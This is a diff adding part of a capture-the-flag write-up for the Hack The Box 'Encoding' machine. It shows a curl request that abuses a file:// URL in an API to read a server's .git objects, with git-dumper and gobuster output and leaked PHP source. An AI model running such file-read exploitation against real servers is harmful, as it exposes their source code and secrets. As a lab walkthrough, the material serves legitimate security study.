@@ -235,4 +235,173 @@ To get around this i'll leverage the file inclusion to dump the git project
 
 To achieve a successfull dump i'll modify the curl query with the following parameters: the content-type in the header will be application/json, a binary file will be sent with the data specified in the --data-binary argument, which includes the str2hex action values and the address URL of the file file:///var/www/image/.git/$objname in the haxtables API http://api.haxtables.htb/v3/tools/string/index.php. The response will be processed with jq to extract only the relevant data and then xxd will be used to convert the hexadecimal output to a binary file which will be saved to $target
 
+```
+└─$ curl -X POST -H 'Content-Type: application/json' --data-binary "{\"action\": \"str2hex\", \"file_url\": \"file:///var/www/image/.git/$objname\"}" 'http://api.haxtables.htb/v3/tools/string/index.php' | jq .data | xxd -r -p > "$target"
+
+└─$ ./gitdumper.sh http://image.haxtables.htb/.git/ git
+[*] Destination folder does not exist
+[+] Creating git/.git/
+[+] Downloaded: HEAD
+[+] Downloaded: objects/info/packs
+[+] Downloaded: description
+[+] Downloaded: config
+[+] Downloaded: COMMIT_EDITMSG
+[+] Downloaded: index
+[+] Downloaded: packed-refs
+[+] Downloaded: refs/heads/master
+[+] Downloaded: refs/remotes/origin/HEAD
+[+] Downloaded: refs/stash
+[+] Downloaded: logs/HEAD
+[+] Downloaded: logs/refs/heads/master
+[+] Downloaded: logs/refs/remotes/origin/HEAD
+[+] Downloaded: info/refs
+[+] Downloaded: info/exclude
+[+] Downloaded: /refs/wip/index/refs/heads/master
+[+] Downloaded: /refs/wip/wtree/refs/heads/master
+[+] Downloaded: objects/9c/17e5362e5ce2f30023992daad5b74cc562750b
+[+] Downloaded: objects/00/00000000000000000000000000000000000000
+[+] Downloaded: objects/a8/5ddf4be9e06aa275d26dfaa58ef407ad2c8526
+[+] Downloaded: objects/30/617cae3686895c80152d93a0568e3d0b6a0c49
+[+] Downloaded: objects/a1/ac03b768b16cb11819d2ba9bc9016e18c2f1d9
+[+] Downloaded: objects/26/c6c873fe81c801d731e417bf5d92e5bfa317d2
+[+] Downloaded: objects/9a/515b22daea1a74bbcf5d348ad9339202a8edd6
+[+] Downloaded: objects/2a/a032b5df9bbaeedff30b6e13be938e48cae5f4
+[+] Downloaded: objects/72/f0e39a9438fc0f915f63e2f26b762eb170cf8b
+[+] Downloaded: objects/e0/74c833c28d3b024eeea724cf892a440f89a5aa
+[+] Downloaded: objects/ec/9b154d84cab1888e2724c1083bf97eb57837c9
+[+] Downloaded: objects/31/f5bbb2ab636f275e1db54e594911646a6e2d16
+[+] Downloaded: objects/2d/600ee8a453abd9bd515c41c8fa786b95f96f82
+[+] Downloaded: objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391
+[+] Downloaded: objects/3d/6e60659977f6c6d900f094ab0e33ed594c8dab
+[+] Downloaded: objects/f9/d432448807f47dfd13cb71acc3fd6890f21ee0
+[+] Downloaded: objects/c1/308cdc2b0fac3eb5b1e0872cdec44941ff22f5
+[+] Downloaded: objects/e4/13857aba2ad6d1692337fa09d9ccf00f64aad0
+[+] Downloaded: objects/62/370b37f2f05b910c76c23d1d4ce9f7e3413ea6
+```
+
+So i'll extract all commits using extrator.sh
+
+```
+└─$ ./extractor.sh git extracted
+[*] Destination folder does not exist
+[*] Creating...
+[+] Found commit: 9c17e5362e5ce2f30023992daad5b74cc562750b
+[+] Found folder: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/actions
+[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/actions/action_handler.php
+[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/actions/image2pdf.php
+[+] Found folder: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/assets
+[+] Found folder: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/assets/img
+[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/assets/img/forestbridge.jpg
+[+] Found folder: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/includes
+[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/includes/coming_soon.html
+[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/index.php
+[+] Found folder: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/scripts
+[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/scripts/git-commit.sh
+[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/utils.php
+[+] Found commit: a85ddf4be9e06aa275d26dfaa58ef407ad2c8526
+[+] Found folder: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/actions
+[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/actions/action_handler.php
+[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/actions/image2pdf.php
+[+] Found folder: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/assets
+[+] Found folder: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/assets/img
+[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/assets/img/forestbridge.jpg
+[+] Found folder: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/includes
+[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/includes/coming_soon.html
+[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/index.php
+[+] Found folder: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/scripts
+[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/scripts/git-commit.sh
+[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/utils.php
+```
+
+We see a file called `action_handler.php` by looking at the commits being dumped
+
+Lets read its content
+
+```
+└─$ cat 0-9c17e5362e5ce2f30023992daad5b74cc562750b/actions/action_handler.php
+```
+
+It shows 
+![image](https://user-images.githubusercontent.com/113513376/218315343-312a33f3-26a0-40a4-9a16-a0077db54828.png)
+
+Noticing the code shows it vuln to LFI via the GET [page] parameter
+
+Now i'll enumerate for files using .php as an extension to be added
+
+```
+└─$ gobuster dir -u http://haxtables.htb/ -w /usr/share/wordlists/dirb/common.txt -x php
+===============================================================
+Gobuster v3.2.0-dev
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://haxtables.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.2.0-dev
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+2023/02/12 14:58:59 Starting gobuster in directory enumeration mode
+===============================================================
+/assets               (Status: 301) [Size: 315] [--> http://haxtables.htb/assets/]
+/handler.php          (Status: 200) [Size: 38]
+/includes             (Status: 301) [Size: 317] [--> http://haxtables.htb/includes/]
+/index.php            (Status: 200) [Size: 1999]
+/index.php            (Status: 200) [Size: 1999]
+/server-status        (Status: 403) [Size: 278]
+Progress: 9220 / 9230 (99.89%)
+===============================================================
+2023/02/12 15:02:59 Finished
+===============================================================
+
+```
+
+Checking the handler.php file shows it requires a parameter
+
+```
+└─$ curl http://haxtables.htb/handler.php
+{"message":"Insufficient parameters!"}  
+```
+
+Using the file inclusion i'll read the content of handler.php
+![image](https://user-images.githubusercontent.com/113513376/218315717-7da8222c-7eda-422c-a190-251497f8dd7f.png)
+
+```
+└─$ python3 api_send.py| jq .data | xxd -r -p
+<?php
+include_once '../api/utils.php';
+
+if (isset($_FILES['data_file'])) {
+    $is_file = true;
+    $action = $_POST['action'];
+    $uri_path = $_POST['uri_path'];
+    $data = $_FILES['data_file']['tmp_name'];
+
+} else {
+    $is_file = false;
+    $jsondata = json_decode(file_get_contents('php://input'), true);
+    $action = $jsondata['action'];
+    $data = $jsondata['data'];
+    $uri_path = $jsondata['uri_path'];
+
+
+
+    if ( empty($jsondata) || !array_key_exists('action', $jsondata) || !array_key_exists('uri_path', $jsondata)) 
+    {
+        echo jsonify(['message' => 'Insufficient parameters!']);
+        // echo jsonify(['message' => file_get_contents('php://input')]);
+
+    }
+
+}
+
+$response = make_api_call($action, $data, $uri_path, $is_file);
+echo $response;
+
+?>
+```
+
+
 
